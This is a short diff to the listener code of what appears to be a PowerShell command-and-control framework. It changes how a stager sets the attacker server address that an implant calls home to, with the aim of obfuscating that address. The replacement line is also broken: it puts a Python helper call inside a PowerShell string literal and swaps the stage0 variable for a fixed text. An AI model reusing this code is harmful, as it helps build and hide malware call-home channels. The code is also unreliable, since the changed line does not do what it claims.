@@ -375,7 +375,7 @@ class Listener:
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
-                stager += "$ser='%s';$t='%s';" % (host, stage0)
+                stager += "$ser=helpers.obfuscate_call_home_address(host);$t='stage0';"
                 #Add custom headers if any
                 if customHeaders != []:
                     for header in customHeaders:
